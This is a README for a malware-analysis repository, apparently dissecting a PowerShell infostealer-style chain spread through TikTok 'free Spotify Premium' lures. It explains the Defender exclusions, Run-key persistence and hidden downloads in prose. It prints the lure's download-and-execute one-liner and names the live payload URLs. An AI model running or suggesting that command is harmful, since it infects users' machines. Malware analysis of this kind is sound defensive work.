# allaivo.me-virus-decompiled
Decompilation of the Allaivo.me Virus, which is spread via TikTok videos which persuade users with free spotify premium

## ⚠️ WARNING ⚠️
**DO NOT run any of the code in this repository.** This repository contains decompiled malware code for educational and analysis purposes only. Running any scripts or executables from this repository could infect your system with malware.

## How does the virus get ran in the first place?

Using a TikTok Video, the user is tricked into running a powershell command `iex (irm allaivo.me/spotify)` (any URL path can be used), which then runs the script `first-payload.ps1`.

## Analysis of first-payload.ps1

This is the initial script that executes when the victim runs the powershell command. Here's a breakdown of what it does:

### 1. Anti-Virus Evasion
- Creates a function `Add-Exclusion` that attempts to add paths to Windows Defender exclusions
- This prevents Windows Defender from scanning the malware files

### 2. Persistence Mechanism Setup
- Creates hidden directories:
  - A persistent folder at `%APPDATA%\UpdateCache`
  - A temporary folder with a random GUID name in `%LOCALAPPDATA%`
- Adds these folders to Windows Defender exclusions

### 3. Malware Download
- Contains Base64-encoded URLs to hide the actual destinations:
  - Decodes to `https://amssh.co/file.exe` for the main malware executable
  - Decodes to `https://amssh.co/script.ps1` for a persistence script
- Uses a custom function `Download-FileWithRetries` to download these files with retry logic

### 4. Malware Execution
- Attempts to run the downloaded executable with administrator privileges
- Uses hidden window style to avoid detection by the user
- Waits for the malware to finish execution

### 5. Persistence Installation
- If the malware execution is successful (exit code 0):
  - Downloads a second script named `WindowsUpdate.ps1` to the persistent folder
  - Sets this file as hidden
  - Creates a registry key in `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run`
  - This ensures the malware runs every time the user logs in

### 6. Cleanup
- Attempts to remove the temporary folder to hide evidence of the attack

This malware uses disguised names like "WindowsUpdate.ps1" and "UpdateCache" to appear legitimate while establishing persistence on the victim's system.

## Analysis of `https://amssh.co/file.exe` (second-payload.exe-DO-NOT-RUN)

I ended up doing Dynamic Analysis of the `file.exe` file, which is the main malware file.
However there is a decompiled version of this file, which is availbe in Decompiled/second-payload-decompiled-binaryninja.cpp

The any.run analysis is available [here](https://app.any.run/tasks/acc406c3-1b44-453a-b2ae-deb62d341d19)

